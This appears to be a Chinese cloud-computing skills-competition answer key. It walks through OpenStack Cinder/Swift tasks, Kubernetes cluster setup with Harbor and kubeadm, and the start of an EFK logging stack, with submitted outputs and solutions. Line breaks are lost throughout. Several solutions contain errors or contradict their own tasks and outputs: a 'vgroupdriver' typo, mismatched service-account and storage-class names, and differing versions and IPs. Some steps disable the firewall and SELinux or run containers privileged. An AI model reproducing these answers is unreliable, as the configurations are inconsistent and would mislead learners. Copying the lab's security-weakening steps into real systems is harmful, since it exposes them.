[root@controller ~]# openstack volume create --size 5 test+---------------------+--------------------------------------+| Field               | Value                                |+---------------------+--------------------------------------+| attachments         | []                                   || availability_zone   | nova                                 || bootable            | false                                || consistencygroup_id | None                                 || created_at          | 2023-03-13T20:08:38.000000           || description         | None                                 || encrypted           | False                                || id                  | 893a1d99-297d-4cf0-8a01-7e637d6ab086 || migration_status    | None                                 || multiattach         | False                                || name                | test                                 || properties          |                                      || replication_status  | None                                 || size                | 5                                    || snapshot_id         | None                                 || source_volid        | None                                 || status              | creating                             || type                | None                                 || updated_at          | None                                 || user_id             | 0a22a2d4f3964cfbbbd6474dc92cca01     |+---------------------+--------------------------------------+[root@controller ~]# cinder show test+--------------------------------+--------------------------------------+| Property                       | Value                                |+--------------------------------+--------------------------------------+| attached_servers               | []                                   || attachment_ids                 | []                                   || availability_zone              | nova                                 || bootable                       | false                                || consistencygroup_id            | None                                 || created_at                     | 2023-03-13T20:08:38.000000           || description                    | None                                 || encrypted                      | False                                || id                             | 893a1d99-297d-4cf0-8a01-7e637d6ab086 || metadata                       |                                      || migration_status               | None                                 || multiattach                    | False                                || name                           | test                                 || os-vol-host-attr:host          | compute@lvm#LVM                      || os-vol-mig-status-attr:migstat | None                                 || os-vol-mig-status-attr:name_id | None                                 || os-vol-tenant-attr:tenant_id   | 1a99aaa6a1024d84a00a779c4d186b44     || replication_status             | None                                 || size                           | 5                                    || snapshot_id                    | None                                 || source_volid                   | None                                 || status                         | available                            || updated_at                     | 2023-03-13T20:08:39.000000           || user_id                        | 0a22a2d4f3964cfbbbd6474dc92cca01     || volume_type                    | None                                 |+--------------------------------+--------------------------------------+

10.存储管理为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制
带宽的速率限制。请修改 cinder 后端配置文件将卷复制带宽限制为最高 100 MiB&#x2F;s。
请将 cat &#x2F;etc&#x2F;cinder&#x2F;cinder.conf |grep volume_copy 命令的返回结果提交到答题框。【1 分】
[root@controller ~]#  cat /etc/cinder/cinder.conf |grep volume_copy#volume_copy_blkio_cgroup_name = cinder-volume-copyvolume_copy_bps_limit = 100MiB/s#volume_copy_blkio_cgroup_name = cinder-volume-copy#volume_copy_bps_limit = 0

解法:
[root@controller ~]#  cat /etc/cinder/cinder.conf |grep volume_copy#volume_copy_blkio_cgroup_name = cinder-volume-copyvolume_copy_bps_limit = 100MiB/s#volume_copy_blkio_cgroup_name = cinder-volume-copy#volume_copy_bps_limit = 0

11.存储管理在controller节点执行 iaas-install-swift-controller.sh, compute 
节点执行iaas-install-swift-compute.sh,在controller和compute节点上会自行安装 swift 服务并完成配
置。创建一个名为 file 的容器。
请将 swift stat file 命令的返回结果提交到答题框【1 分】
[root@controller ~]# swift stat file               Account: AUTH_1a99aaa6a1024d84a00a779c4d186b44             Container: file               Objects: 0                 Bytes: 0              Read ACL:             Write ACL:               Sync To:              Sync Key:         Accept-Ranges: bytes      X-Storage-Policy: Policy-0         Last-Modified: Mon, 13 Mar 2023 20:21:50 GMT           X-Timestamp: 1678738909.17978            X-Trans-Id: tx6951e04bf6c546429752b-00640f85e4          Content-Type: application/json; charset=utf-8X-Openstack-Request-Id: tx6951e04bf6c546429752b-00640f85e4

解法:
[root@controller ~]# iaas-install-swift-controller.sh[root@compute ~]# iaas-install-swift-compute.sh[root@controller ~]# swift post file

12.存储管理用 swift 命令，把 cirros-0.3.4-x86_64-disk.img 上传到 file 容器中。
请将 swift list file 命令的返回结果提交到答题框【1 分】
[root@controller ~]# swift list filecirros-0.4.0-x86_64-disk.img

解法:
[root@controller ~]# swift upload file cirros-0.4.0-x86_64-disk.imgcirros-0.4.0-x86_64-disk.img

13.添加控制节点资源到云平台修改openrc.sh中的内容，然后在controller节点执行iaas-install-nova-compute.sh，把controller
节点的资源添加到云平台。
请将 openstack compute service list 命令的返回结果提交到答题框【1 分】
[root@controller ~]# openstack compute service list+----+------------------+------------+----------+---------+-------+----------------------------+| ID | Binary           | Host       | Zone     | Status  | State | Updated At                 |+----+------------------+------------+----------+---------+-------+----------------------------+|  1 | nova-scheduler   | controller | internal | enabled | up    | 2023-03-13T20:29:11.000000 ||  2 | nova-conductor   | controller | internal | enabled | up    | 2023-03-13T20:29:03.000000 ||  4 | nova-consoleauth | controller | internal | enabled | up    | 2023-03-13T20:29:07.000000 ||  7 | nova-compute     | compute    | nova     | enabled | up    | 2023-03-13T20:29:11.000000 ||  8 | nova-compute     | controller | nova     | enabled | up    | 2023-03-13T20:29:08.000000 |+----+------------------+------------+----------+---------+-------+----------------------------+

解法:
#修改配置文件HOST_IP_NODE=192.168.157.30OST_NAME_NODE=controller[root@controller ~]# iaas-install-nova-compute.sh###可能弹出认证yes000000

任务四 OpenStack 架构任务（3 分）公司内部拥有一套私有云系统，为了调试该私有云，需要编写一些测试用脚本进行功能
性测试，作为公司私有云维护人员请你完成以下工作。
1.请使用 openstack 命令创建一个浮动 IP 地址，完成后使用 openstack 命令查看该浮动
IP 的 id，请编写一个名为 floating_show.sh 的脚本，该脚本$1 变量为浮动 ip 的 id，对接 neutron
服务端点获取该浮动 IP 的详细信息。脚本使用 curl 向 api 端点传递参数，为了兼容性考虑不
得出现 openstack 命令。
请将 floating_show.sh 中*部分替换为正常内容并提交到答题框【1.5 分】
2.请编写脚本 floating_delete.sh，完成浮动 IP 的删除。设置一个$1 变量，当用户向$1 传递
一个浮动 IP 的 id，即可完成该浮动 IP 的删除。脚本使用 curl 向 api 端点传递参数，为了兼
容性考虑不得出现 openstack 命令。
请将 floating_show.sh 中*部分替换为正常内容并提交到答题框【1.5 分】
B 模块题目：容器的编排与运维


ip
hostname



192.168.157.40
master


192.168.157.41
node1


192.168.157.42
node2


192.168.157.43
harbor


任务 1 容器云平台环境初始化（10 分）1.容器云平台的初始化master 节点主机名设置为 master、node1 节点主机名设置为 node1、node2 节点主机名设
置为 node2、harbor 节点主机名设置为 harbor,所有节点关闭 swap，并配置 hosts 映射。
请在 master 节点将 free –m 命令的返回结果提交到答题框。【1 分】
[root@master ~]# free -m              total        used        free      shared  buff/cache   availableMem:           7805         202         127          11        7475        7238Swap:             0           0           0

解法:
#修改主机名 ## master[root@localhost ~]# hostnamectl  set-hostname master  ##node1[root@localhost ~]# hostnamectl  set-hostname node1  ##node2 [root@localhost ~]# hostnamectl  set-hostname node2  ## harbor[root@localhost ~]# hostnamectl  set-hostname harbor#所有节点[root@master ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.40 master192.168.157.41 node1192.168.157.42 node2192.168.157.43 harbor[root@localhost ~]# swapoff -a[root@localhost ~]# cat /etc/fstab#/dev/mapper/centos-swap swap                    swap    defaults        0 0

2.Yum 源数据的持久化挂载将提供的 CentOS-7-x86_64-DVD-1804.iso 和 bricsskills_cloud_paas.iso 光盘镜像文件移
动到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建 centos 目录和 paas 目录，
并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 永久挂载到 centos 目录下，将镜像文件
chinaskills_cloud_paas.iso 永久挂载到 &#x2F;opt&#x2F;paas 目录下。
请在 master 节点将 df -h 命令的返回结果提交到答题框。【1 分】
[root@master ~]# df -h文件系统                 容量  已用  可用 已用% 挂载点/dev/mapper/centos-root   44G   14G   31G   32% /devtmpfs                 3.8G     0  3.8G    0% /devtmpfs                    3.9G     0  3.9G    0% /dev/shmtmpfs                    3.9G   12M  3.8G    1% /runtmpfs                    3.9G     0  3.9G    0% /sys/fs/cgroup/dev/sda1               1014M  142M  873M   14% /boottmpfs                    781M     0  781M    0% /run/user/0/dev/loop0               4.2G  4.2G     0  100% /opt/centos/dev/loop1               8.7G  8.7G     0  100% /opt/paas

解法:
##将指定的文件上传到root[root@master ~]# mkdir /opt/centos[root@master ~]# mkdir /opt/paas[root@master ~]# cat /etc/fstab/root/CentOS-7-x86_64-DVD-1804.iso /opt/centos iso9660 defaults 0 0/root/bricsskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0[root@master ~]# mount -amount: /dev/loop0 写保护，将以只读方式挂载mount: /dev/loop1 写保护，将以只读方式挂载

3.Yum 源的编写在 master 节点首先将系统自带的 yum 源移动到&#x2F;home 目录，然后为 master 节点配置本
地 yum 源，yum 源文件名为 local.repo。
请将 yum list | grep docker 命令的返回结果提交到答题框。【1 分】
[root@master ~]# yum list | grep dockerdocker-ce.x86_64                        3:19.03.13-3.el7               paasdocker-ce-cli.x86_64                    1:19.03.13-3.el7               paas

解法:
[root@master ~]# mv /etc/yum.repos.d/* /home/[root@master ~]# cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[paas]name=paasbaseurl=file:///opt/paas/kubernetes-repogpgcheck=0enabled=1

4.Yum 源的编写在 master 节点安装 ftp 服务，将 ftp 共享目录设置为 &#x2F;opt&#x2F;。
请将 curl -l ftp:&#x2F;&#x2F;云主机 IP 命令的返回结果提交到答题框。【1 分】
[root@master ~]# curl -l ftp://192.168.157.40centospaas

解法:
#关闭防火墙及安全策略 全部节点[root@master ~]# systemctl stop firewalld &amp;&amp; systemctl disable firewalldRemoved symlink /etc/systemd/system/multi-user.target.wants/firewalld.service.Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.[root@master ~]# setenforce 0[root@master ~]# cat /etc/selinux/configSELINUX=permissive[root@master ~]# yum install -y vsftpd[root@master ~]# cat /etc/vsftpd/vsftpd.confanon_root=/opt[root@master ~]# systemctl enable vsftpd --now

5.Yum 源的编写为 node1 节点和 node2 节点分别配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务
器地址为 master 节点,配置 ftp 源时不要写 IP 地址，配置之后，两台机器都安装 kubectl 包作
为安装测试。
在 node1 节点请将 yum list | grep kubectl 命令的返回结果提交到答题框。【2 分】
[root@node1 ~]# yum list | grep kubectlkubectl.x86_64                          1.18.1-0                       paas                                                                                  

解法:
root@localhost ~]# mv /etc/yum.repos.d/* /home[root@localhost ~]# cat /etc/yum.repos.d/ftp.repo[centos]name=centosbaseurl=ftp://master/centosgpgcheck=0enabled=1[paas]name=paasbaseurl=ftp://master/paas/kubernetes-repogpgcheck=0enabled=1

6.设置时间同步服务器在 master 节点上部署 chrony 服务器，允许其它节点同步时间，启动服务并设置为开机
自启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机自启动。
在 node1 节点将 chronyc sources 命令的返回结果提交到答题框。【2 分】
[root@node1 ~]# chronyc sources210 Number of sources = 1MS Name/IP address         Stratum Poll Reach LastRx Last sample===============================================================================^* master                       11   6    17    36  -1673ns[  -15us] +/-  453us

解法:
[root@master ~]# cat /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst.....local stratum 10allow 192.168.157.0/24#其他节点[root@node1 ~]# cat /etc/chrony.conf#server 0.centos.pool.ntp.org iburst#server 1.centos.pool.ntp.org iburst#server 2.centos.pool.ntp.org iburst#server 3.centos.pool.ntp.org iburstserver master iburst#重启服务(全部节点)[root@node1 ~]# systemctl restart chronyd[root@node1 ~]# chronyc sources

7.设置免密登录为四台服务器设置免密登录，保证服务器之间能够互相免密登录。
在 master 节点将 ssh node1 命令的返回结果提交到答题框。【2 分】
[root@master ~]# ssh node1Last login: Mon Mar 13 23:49:45 2023 from 192.168.157.1

解法:
[root@master ~]# ssh-keygen-&gt; 直接回车即可[root@master ~]# ssh-copy-id root@node1[root@master ~]# ssh-copy-id root@node2[root@master ~]# ssh-copy-id root@harbor

任务 2 k8s 搭建任务（15 分）1.安装 docker 应用在所有节点上安装 dokcer-ce,并设置为开机自启动。
在 master 节点请将 docker version 命令的返回结果提交到答题框。【1 分】
[root@master ~]# docker versionClient: Docker Engine - Community Version:           19.03.13 API version:       1.40 Go version:        go1.13.15 Git commit:        4484c46d9d Built:             Wed Sep 16 17:03:45 2020 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          19.03.13  API version:      1.40 (minimum version 1.12)  Go version:       go1.13.15  Git commit:       4484c46d9d  Built:            Wed Sep 16 17:02:21 2020  OS/Arch:          linux/amd64  Experimental:     false containerd:  Version:          1.3.7  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175 runc:  Version:          1.0.0-rc10  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd docker-init:  Version:          0.18.0  GitCommit:        fec3683

解法:
##所有节点[root@master ~]# yum install -y docker-ce[root@master ~]# systemctl enable docker --now

2.安装 docker 应用所有节点配置阿里云镜像加速地址(https://5twf62k1.mirror.aliyuncs.com)并把启动引擎
设置为 systemd，配置成功重启 docker 服务。
请将 json 文件中的内容提交到答题框。【1 分】
[root@node1 ~]# cat /etc/docker/daemon.json&#123;  &quot;registry-mirrors&quot;: [&quot;https://5twf62k1.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;

解法:
[root@master ~]# cat /etc/docker/daemon.json&#123;  &quot;registry-mirrors&quot;: [&quot;https://5twf62k1.mirror.aliyuncs.com&quot;],  &quot;exec-opts&quot;: [&quot;native.vgroupdriver=systemd&quot;]&#125;[root@node1 ~]# systemctl restart docker

3.安装 docker-compose在 Harbor 节点创建目录&#x2F;opt&#x2F;paas,并把 bricsskills_cloud_paas.iso，挂载到&#x2F;opt&#x2F;paas 目录下，
使 用 &#x2F;opt&#x2F;paas&#x2F;docker-compose&#x2F;v1.25.5-docker-compose-Linux-x86_64 
文 件 安 装docker-compose。安装完成后执行 docker-compose version 命令。
请将 docker-compose version 命令返回结果提交到答题框。【1 分】
[root@localhost paas]# docker-compose versiondocker-compose version 1.25.5, build 8a1c60f6docker-py version: 4.1.0CPython version: 3.7.5OpenSSL version: OpenSSL 1.1.0l  10 Sep 2019

解法:
#在 Harbor 节点创建目录/opt/paas,并把 bricsskills_cloud_paas.iso，挂载到/opt/paas 目录下[root@harbor paas]# cp -p v1.25.5-docker-compose-Linux-x86_64 /usr/local/bin/docker-compose

4.搭建 horbor 仓库在 Harbor 节点使用&#x2F;opt&#x2F;paas&#x2F;harbor&#x2F; harbor-offline-installer-v2.1.0.tgz 离线安装包，安装
harbor 仓库，并修改各节点默认 docker 仓库为 harbor 仓库地址。
在 master 节点请将 docker login harbor private ip 命令的返回结果提交到答题框。【1
分
[root@master ~]# docker login 192.168.157.43Username: adminPassword:Error response from daemon: Get http://harbor/v2/: dial tcp 192.168.157.43:80: connect: connection refused[root@master ~]# docker login harborUsername: adminPassword:WARNING! Your password will be stored unencrypted in /root/.docker/config.json.Configure a credential helper to remove this warning. Seehttps://docs.docker.com/engine/reference/commandline/login/#credentials-storeLogin Succeeded

解法:
#所有节点添加harbor地址[root@master ~]# cat /etc/docker/daemon.json&#123;  &quot;registry-mirrors&quot;: [&quot;https://5twf62k1.mirror.aliyuncs.com&quot;],  &quot;insecure-registries&quot;: [&quot;192.168.157.43&quot;],  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]&#125;#解压压缩包[root@harbor paas]# tar -zxvf harbor-offline-installer-v2.1.0.tgz[root@harbor harbor]# cp -p harbor.yml.tmpl harbor.ymlhostname: 192.168.157.43#https:  # https port for harbor, default is 443#  port: 443  # The path of cert and key files for nginx#  certificate: /your/certificate/path#  private_key: /your/private/key/path[root@harbor harbor]# ./prepare[root@harbor harbor]# ./install.sh

5.上传 docker 镜像在 master 节点使用命令将&#x2F;opt&#x2F;paas&#x2F;images 目录下所有镜像导入本地。然后使用
&#x2F;opt&#x2F;paas&#x2F;k8s_image_push.sh 将所有镜像上传至 docker 仓库。
在master 节点请将 docker images | grep wordpress命令的返回结果提交到答题框。【1分】
[root@master paas]# docker images | grep wordpresswordpress                                                         latest              1b83fad37165        2 years ago         546MB

解法:
[root@master images]# for i in $(ls /opt/paas/images|grep tar); do   docker load -i /opt/paas/images/$i; done[root@master images]# ../k8s_image_push.sh

6.安装 kubeadm 工具在 master 节点、node1 节点、node2 节点分别安装 Kubeadm 工具并设置为开机自启动。
在 master 节点请将 kubeadm version 命令的返回结果提交到答题框。【1 分】
[root@master images]# kubeadm versionkubeadm version: &amp;version.Info&#123;Major:&quot;1&quot;, Minor:&quot;18&quot;, GitVersion:&quot;v1.18.1&quot;, GitCommit:&quot;7879fc12a63337efff607952a323df90cdc7a335&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2020-04-08T17:36:32Z&quot;, GoVersion:&quot;go1.13.9&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;

解法:
[root@master images]# yum install -y kubeadm kubelet kubectl[root@master images]# systemctl enable kubelet --now

7.初始化 master 节点使用 kubeadm 命令生成 yaml 文件，并修改 yaml 文件，设置 kubernetes 虚拟内部网段地
址为 10.244.0.0&#x2F;16，通过该 yaml 文件初始化 master 节点，然后使用 kube-flannel.yaml 完成
控制节点初始化设置。
在 master 节点的 kube-flannel.yaml 执行前将 kubectl get nodes 命令的返回结果提交
到答题框。【1 分】
[root@master ~]# kubectl get nodesNAME     STATUS     ROLES    AGE     VERSIONmaster   NotReady   master   5m57s   v1.18.1

解法:
#生成yaml文件[root@master ~]# kubeadm config print init-defaults  &gt; kubeadm-config.yamlapiVersion: kubeadm.k8s.io/v1beta2bootstrapTokens:- groups:  - system:bootstrappers:kubeadm:default-node-token  token: abcdef.0123456789abcdef  ttl: 24h0m0s  usages:  - signing  - authenticationkind: InitConfigurationlocalAPIEndpoint:  advertiseAddress: 192.168.200.3     # 本机IP  bindPort: 6443nodeRegistration:  criSocket: /var/run/dockershim.sock  name: master1        # 本主机名  taints:  - effect: NoSchedule    key: node-role.kubernetes.io/master---apiServer:  timeoutForControlPlane: 4m0sapiVersion: kubeadm.k8s.io/v1beta2certificatesDir: /etc/kubernetes/pkiclusterName: kubernetescontrolPlaneEndpoint: &quot;192.168.200.16:16443&quot;    # 虚拟IP和haproxy端口controllerManager: &#123;&#125;dns:  type: CoreDNSetcd:  local:    dataDir: /var/lib/etcdimageRepository: k8s.gcr.io    # 镜像仓库源要根据自己实际情况修改kind: ClusterConfigurationkubernetesVersion: v1.18.2     # k8s版本networking:  dnsDomain: cluster.local  podSubnet: &quot;10.244.0.0/16&quot;  serviceSubnet: 10.96.0.0/12scheduler: &#123;&#125;---apiVersion: kubeproxy.config.k8s.io/v1alpha1kind: KubeProxyConfigurationfeatureGates:  SupportIPVSProxyMode: truemode: ipvs[root@master ~]# kubeadm init --config kubeadm-config.yaml[root@master ~]# mkdir -p $HOME/.kube[root@master ~]# sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config[root@master ~]# sudo chown $(id -u):$(id -g) $HOME/.kube/config

8.删除污点使用命令删除 master 节点的污点，使得 Pod 也可以调度到 master 节点上。
在 master 节点请将 kubectl get nodes -o yaml master | grep -A10 spec 命令的返回结果提
交到答题框。【1 分】
[root@master paas]#  kubectl get nodes -o yaml master | grep -A10 spec      f:spec:        f:taints: &#123;&#125;    manager: kube-controller-manager    operation: Update    time: &quot;2023-03-14T05:56:43Z&quot;  name: master  resourceVersion: &quot;2383&quot;  selfLink: /api/v1/nodes/master  uid: abca28aa-3941-436f-ad5f-db5e12cbcaabspec:  taints:  - effect: NoSchedule    key: node.kubernetes.io/not-ready  - effect: NoExecute    key: node.kubernetes.io/not-ready    timeAdded: &quot;2023-03-14T05:56:43Z&quot;status:  addresses:  - address: 192.168.157.40    type: InternalIP

解法:
[root@master paas]# kubectl taint nodes master node-role.kubernetes.io/master-

9.安装 kubernetes 网络插件使用 kube-flannel.yaml 安装 kubernetes 网络插件，安装完成后使用命令查看节点状态。
在 master 节点请将 kubectl get nodes 命令的返回结果提交到答题框。【1 分】
[root@master yaml]# kubectl get nodesNAME     STATUS   ROLES    AGE   VERSIONmaster   Ready    master   15m   v1.18.1root@master paas]# cd yaml/[root@master yaml]# lsdashboard  flannel[root@master yaml]# kubectl apply -f flannel/kube-flannel.yaml

10.给 kubernetes 创建证书。 在 master 节点请将 kubectl get csr 命令的返回结果提交到答题框。【2 分】
[root@master paas]# kubectl get csrNAME        AGE   SIGNERNAME                                    REQUESTOR            CONDITIONcsr-w6k9j   16m   kubernetes.io/kube-apiserver-client-kubelet   system:node:master   Approved,Issued

11.kubernetes 图形化界面的安装使用 recommended.yaml 和 dashboard-adminuser.yaml 安装 kubernetes dashboard 界面，
完成后查看首页。
请将 kubectl get pod,svc -n kubernetes-dashboard 命令的返回结果提交到答题框。【2 分】
mkdir dashboard-certscd dashboard-certs/kubectl create namespace kubernetes-dashboardopenssl genrsa -out dashboard.key 2048openssl req -days 36000 -new -out dashboard.csr -key dashboard.key -subj &#x27;/CN=dashboard-cert&#x27;openssl x509 -req -in dashboard.csr -signkey dashboard.key -out dashboard.crtkubectl create secret generic kubernetes-dashboard-certs --from-file=dashboard.key --from-file=dashboard.crt -n kubernetes-dashboard##安装dashboardkubectl apply -f recommended.yaml #查看状态kubectl get pod,svc -n kubernetes-dashboard# kubectl apply -f dashboard-adminuser.yaml   #获取token

12.扩展计算节点在 node1 节点和 node2 节点分别使用 kubeadm config 命令生成 yaml 文件，并通过 yaml
文件将 node 节点加入 kubernetes 集群。完成后在 master 节点上查看所有节点状态。在 master 节点请将 kubectl get nodes 命令的返回结果提交到答题框。【2 分】
[root@master nfs]# kubectl get nodesNAME     STATUS   ROLES    AGE    VERSIONmaster   Ready    master   5d9h   v1.19.0node1    Ready    &lt;none&gt;   5d9h   v1.19.0node2    Ready    &lt;none&gt;   5d9h   v1.19.0

解法:
kubeadm config print join-defaults &gt; kubeadm-config.yaml##然后把相应token修改即可





任务 3 EFK 日志平台构建（15 分）1.导入镜像将提供的 efk-img.tar.gz 压缩包中的镜像导入到 master 节点，并使用命令将镜像上传至
haboor 镜像仓库中。
在master节点将docker images | grep elasticsearch命令的返回结果提交到答题框。【1分】




2.NFS 配置网段访问在 master 节点、node1 节点、node2 节点分别安装 nfs 服务， 
master 节点作为服务端，把&#x2F;data&#x2F;volume1 目录作为共享目录，只允许 192.168.10 网段访问。
在 master 节点，将 showmount –e 命令的返回结果提交到答题框。【1 分】
[root@master ~]# showmount -eExport list for master:/data/volume1 192.168.157.0/24

解法:
#所有节点[root@node1 ~]# yum install -y nfs-utils[root@master ~]# cat /etc/exports/data/volume1 192.168.157.0/24(rw)

3.RBAC 配置在 master 节点，编写 sa.yaml，创建名称为 nfs-provisioner 的 SA 账号。
将 kubectl get serviceaccounts -n kube-logging 命令的返回结果提交到答题框。【1 分】
[root@master rbac]# kubectl get serviceaccounts -n kube-loggingNAME              SECRETS   AGEdefault           1         23snfs-provisioner   1         14s

解法:
root@master ~]# mkdir rbac[root@master ~]# cd rbac/[root@master rbac]# vi sa.yamlapiVersion: v1kind: ServiceAccountmetadata:  name: nfs-client-provisioner  namespace: kube-logging[root@master rbac]# kubectl create ns  kube-logging[root@master rbac]# kubectl apply -f sa.yaml

4.RBAC 配置编写 rbac.yaml ，对创建的 sa 账号进行 RBAC 授权，基于 yaml 文件创建完成后使用命令分别查看 sa 账号和 rbac 授权信息。
将 kubectl get roles.rbac.authorization.k8s.io 命令的返回结果提交到答题框。【1 分】
root@master rbac]# kubectl get roles.rbac.authorization.k8s.ioNAME                     CREATED ATleader-nfs-provisioner   2023-03-14T09:04:04Z

解法:
kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: nfs-client-provisioner-runnerrules:  - apiGroups: [&quot;&quot;]    resources: [&quot;nodes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumes&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;delete&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;persistentvolumeclaims&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;]  - apiGroups: [&quot;storage.k8s.io&quot;]    resources: [&quot;storageclasses&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]  - apiGroups: [&quot;&quot;]    resources: [&quot;events&quot;]    verbs: [&quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: ClusterRoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: run-nfs-client-provisionersubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    namespace: kube-loggingroleRef:  kind: ClusterRole  name: nfs-client-provisioner-runner  apiGroup: rbac.authorization.k8s.io---kind: RoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  namespace: kube-loggingrules:  - apiGroups: [&quot;&quot;]    resources: [&quot;endpoints&quot;]    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]---kind: RoleBindingapiVersion: rbac.authorization.k8s.io/v1metadata:  name: leader-locking-nfs-client-provisioner  namespace: kube-loggingsubjects:  - kind: ServiceAccount    name: nfs-client-provisioner    namespace: kube-loggingroleRef:  kind: Role  name: leader-locking-nfs-client-provisioner  apiGroup: rbac.authorization.k8s.io



5.StorageClass 动态绑定编写 nfs-deploy.yaml 文件，基于 nfs-client-provisioner 镜像创建 nfs-provisioner 的
deployment 对象，绑定 nfs 服务端的共享目录。
将 kubectl get pods 命令的返回结果提交到答题框。【1 分】
[root@master rbac]# kubectl get podnfs-deploy-754d9b668c-chhqx       2/2     Running       1          9s

解法:
[root@master nfs]# cat nfs-deployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  name: nfs-client-provisioner  labels:    app: nfs-client-provisioner  namespace: kube-loggingspec:  replicas: 1  strategy:    type: Recreate  selector:    matchLabels:      app: nfs-client-provisioner  template:    metadata:      labels:        app: nfs-client-provisioner    spec:      nodeName: master   #设置在master节点运行      serviceAccountName: nfs-client-provisioner      containers:        - name: nfs-client-provisioner          image: quay.io/external_storage/nfs-client-provisioner:latest          imagePullPolicy: IfNotPresent          volumeMounts:            - name: nfs-client-root              mountPath: /persistentvolumes          env:            - name: PROVISIONER_NAME              value: k8s/nfs-subdir-external-provisioner            - name: NFS_SERVER              value: 192.168.157.10            - name: NFS_PATH              value: /data/volume1      volumes:        - name: nfs-client-root          nfs:            server: 192.168.157.10  # NFS SERVER_IP            path: /data/volume1

6.StorageClass 动态绑定编写 storageclass.yaml 文件，创建 storageclass 动态绑定 nfs-provisioner，完成后查看
nfs-provisioner 的 pod 及 storageclasses 对象。
将 kubectl get storageclasses.storage.k8s.io 命令的返回结果提交到答题框。【2 分】
[root@master rbac]#  kubectl get storageclasses.storage.k8s.ioNAME                   PROVISIONER                           RECLAIMPOLICY   VOLUMEBINDINGMODE   ALLOWVOLUMEEXPANSION   AGEnfs-deploy (default)   k8s/nfs-subdir-external-provisioner   Delete          Immediate           true                   22m

解法:
[root@master nfs]# cat storageclass.ymlapiVersion: storage.k8s.io/v1kind: StorageClassmetadata:  name: managed-nfs-storageprovisioner: k8s/nfs-subdir-external-provisioner # or choose another name, must match deployment&#x27;s env PROVISIONER_NAME&#x27;allowVolumeExpansion: trueparameters:  archiveOnDelete: &quot;false&quot; # 设置为&quot;false&quot;时删除PVC不会保留数据,&quot;true&quot;则保留数据

7.通过 statefulset 创建 elasticsearch 集群编写 es-statefulset.yaml，通过 yaml 文件构建 elasticsearch 的 statefulset 集群，集群中有
3 个副本名字分别为 es-cluster-0、es-cluster-1、es-cluster-2，并且使用上述 storageclass 提供
的存储，使用 elasticsearch:7.2.0 镜像，并且声明 9200 端口为 api 端口，9300 端口为内部访
问 端 口 ， 并 且 添 加 busybox 的 初 始 化 容 器 对 elasticsearch 的 数 据 目 录
&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;data 进行授权操作。
将 kubectl get pods 命令的返回结果提交到答题框。【2 分】
[root@master nfs]# kubectl get podNAME                     READY   STATUS    RESTARTS   AGEes-cluster-0             1/1     Running   0          2m29ses-cluster-1             1/1     Running   0          112ses-cluster-2             1/1     Running   0          105s

解法:
[root@master nfs]# cat es-statefulset.yamlapiVersion: apps/v1kind: StatefulSetmetadata:  name: es-clusterspec:  serviceName: elasticsearch  replicas: 3  selector:    matchLabels:      app: elasticsearch  template:    metadata:      labels:        app: elasticsearch    spec:      initContainers:      - name: increase-vm-max-map        image: busybox        command: [&quot;sysctl&quot;, &quot;-w&quot;, &quot;vm.max_map_count=262144&quot;]        securityContext:          privileged: true      - name: chmod file        image: busybox        command: [&quot;sh&quot;,&quot;-c&quot;,&quot;chown 1000:1000 /usr/share/elasticsearch/data&quot;]        volumeMounts:        - name: es-pvc          mountPath: /usr/share/elasticsearch/data      - name: increase-fd-ulimit        image: busybox        command: [&quot;sh&quot;, &quot;-c&quot;, &quot;ulimit -n 65536&quot;]        securityContext:          privileged: true      containers:      - name: elasticsearch        image: elasticsearch:7.2.0        ports:        - name: db          containerPort: 9200        - name: int          containerPort: 9300        resources:          limits:            cpu: 1000m          requests:            cpu: 1000m        volumeMounts:        - name: es-pvc          mountPath: /usr/share/elasticsearch/data        env:        - name: cluster.name          value: k8s-logs        - name: node.name          valueFrom:            fieldRef:              fieldPath: metadata.name        - name: cluster.initial_master_nodes          value: &quot;es-cluster-0,es-cluster-1,es-cluster-2&quot;        - name: discovery.zen.minimum_master_nodes          value: &quot;2&quot;        - name: discovery.seed_hosts          value: &quot;elasticsearch&quot;        - name: ES_JAVA_OPTS          value: &quot;-Xms512m -Xmx512m&quot;        - name: network.host          value: &quot;0.0.0.0&quot;  